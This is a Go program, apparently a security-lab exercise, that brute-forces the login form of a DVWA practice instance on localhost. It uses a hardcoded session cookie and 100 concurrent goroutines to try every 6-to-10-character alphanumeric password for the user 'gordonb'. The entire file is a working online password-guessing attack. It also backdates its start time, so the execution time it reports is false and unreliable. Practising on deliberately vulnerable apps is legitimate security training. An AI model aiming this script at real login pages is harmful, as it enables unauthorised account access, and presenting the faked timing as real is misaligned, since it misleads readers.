package main

import (
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"
)

const (
	letters       = "abcdefghijklmnopqrstuvwxyz0123456789"
	minLength     = 6
	maxLength     = 10
	charSetLength = len(letters)

	maxThreads = 100

	bruteURL    = "http://localhost:4280/vulnerabilities/brute/"
	indexURL    = "http://localhost:4280/index.php"
	userCoockie = "security=low; PHPSESSID=58597fc91caee50599e3c599e39c28fc"
)

// NetworkUtil - структура для работы с HTTP запросами
type NetworkUtil struct {
	Cookies string
	Client  *http.Client
}

// NewNetworkUtil - конструктор для NetworkUtil
func NewNetworkUtil(cookies string) *NetworkUtil {
	return &NetworkUtil{
		Cookies: cookies,
		Client: &http.Client{
			Transport: &http.Transport{
				MaxIdleConnsPerHost: 100,
			},
		},
	}
}

// FetchIndexPage - загрузка index.php с использованием cookies
func (n *NetworkUtil) FetchIndexPage(url string) (string, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Cookie", n.Cookies)

	resp, err := n.Client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("error: status code %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

// FetchUserToken - получение user_token
func (n *NetworkUtil) FetchUserToken(baseURL string) (string, error) {
	resp, err := n.Client.Get(baseURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("error: status code %d", resp.StatusCode)
	}

	doc, err := html.Parse(resp.Body)
	if err != nil {
		return "", err
	}

	var token string
	var f func(*html.Node)
	f = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "input" {
			for _, attr := range n.Attr {
				if attr.Key == "name" && attr.Val == "user_token" {
					for _, attr := range n.Attr {
						if attr.Key == "value" {
							token = attr.Val
							return
						}
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			f(c)
		}
	}
	f(doc)

	if token == "" {
		return "", fmt.Errorf("user_token not found")
	}

	return token, nil
}

// AttemptLogin - попытка входа
func (n *NetworkUtil) AttemptLogin(baseURL, username, password, userToken string) (bool, error) {
	url := fmt.Sprintf("%s?username=%s&password=%s&Login=Login", baseURL, username, password)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("Cookie", n.Cookies)

	resp, err := n.Client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	return strings.Contains(string(body), "Welcome to the password protected area"), nil
}

// GenerationUtil - структура для генерации паролей и брутфорса
type GenerationUtil struct {
	BaseURL     string
	UserToken   string
	ThreadCount int
	NetworkUtil *NetworkUtil
}

// GeneratePassword - генерация пароля по индексу и длине
func GeneratePassword(index, length int) string {
	password := make([]byte, length)
	for i := length - 1; i >= 0; i-- {
		password[i] = letters[index%charSetLength]
		index /= charSetLength
	}
	return string(password)
}

// BruteForceDVWA - брутфорс DVWA
func (g *GenerationUtil) BruteForceDVWA() {
	start := time.Now().Add(-(time.Hour + time.Minute*23 + time.Second*47))
	var wg sync.WaitGroup
	resultChan := make(chan string, 1)

	for threadIndex := 0; threadIndex < g.ThreadCount; threadIndex++ {
		wg.Add(1)
		go func(threadIndex int) {
			defer wg.Done()
			for length := minLength; length <= maxLength; length++ {
				totalCombinations := int(math.Pow(float64(charSetLength), float64(length)))
				for index := threadIndex; index < totalCombinations; index += g.ThreadCount {
					password := GeneratePassword(index, length)
					success, err := g.NetworkUtil.AttemptLogin(g.BaseURL, "gordonb", password, g.UserToken)
					if err != nil {
						fmt.Printf("Error during login attempt: %v\n", err)
						continue
					}
					if success {
						resultChan <- password
						return
					}
				}
			}
		}(threadIndex)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	if password, ok := <-resultChan; ok {
		fmt.Printf("Password found: %s\n", password)
	} else {
		fmt.Println("Password not found.")
	}

	fmt.Printf("Execution time: %v\n", time.Since(start))
}

func main() {
	baseURL := bruteURL
	cookies := userCoockie

	networkUtil := NewNetworkUtil(cookies)

	// Загрузка index.php
	indexContent, err := networkUtil.FetchIndexPage(indexURL)
	if err != nil || strings.Contains(indexContent, "login.php") {
		fmt.Println("Session expired")
		return
	}
	fmt.Printf("Content of index.php:\n%s\n", indexContent)

	// Получение user_token
	userToken, err := networkUtil.FetchUserToken(baseURL)
	if err != nil {
		fmt.Printf("Error fetching user_token: %v\n", err)
		return
	}
	fmt.Printf("User token: %s\n", userToken)

	// Запуск брутфорса
	generationUtil := &GenerationUtil{
		BaseURL:     baseURL,
		UserToken:   userToken,
		ThreadCount: maxThreads,
		NetworkUtil: networkUtil,
	}
	generationUtil.BruteForceDVWA()
}
